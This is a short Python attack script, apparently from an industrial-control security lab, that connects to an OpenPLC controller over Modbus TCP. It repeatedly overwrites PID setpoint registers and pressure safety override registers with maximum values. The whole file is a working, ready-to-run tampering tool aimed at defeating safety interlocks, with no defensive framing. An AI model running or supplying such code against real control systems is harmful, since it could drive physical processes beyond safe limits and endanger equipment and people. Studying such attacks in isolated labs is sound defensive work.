#!/usr/bin/env python3
"""
Attack 2 — Direct Modbus WRITE
MITRE: T1855 — Remote System Process Manipulation (ICS)
Overwrites OpenPLC setpoint registers AND pressure safety registers from Kali
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def run_attack(host, port=502):
    client = ModbusTcpClient(host, port=int(port))
    if not client.connect():
        print(f"[!] Failed to connect to {host}:{port}")
        sys.exit(1)

    print(f"[*] Connected to {host}:{port}")

    for i in range(10):
        # Phase 1: overwrite PID setpoints %MW0-%MW9
        result = client.write_registers(0, [65535] * 10)
        if hasattr(result, 'isError') and result.isError():
            print(f"[!] Setpoint write failed: {result}")
        else:
            print(f"[+] WRITE {i+1}/10 — registers 0-9 (setpoints) = 65535")

        # Phase 2: overwrite pressure safety override registers
        client.write_register(1025, 65535)
        client.write_register(1026, 65535)
        print(f"[+] WRITE {i+1}/10 — registers 1025-1026 (pressure safety) = 65535")

        time.sleep(3)

    client.close()
    print("[*] Done")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "10.10.50.20"
    port = sys.argv[2] if len(sys.argv) > 2 else 502
    run_attack(host, port)
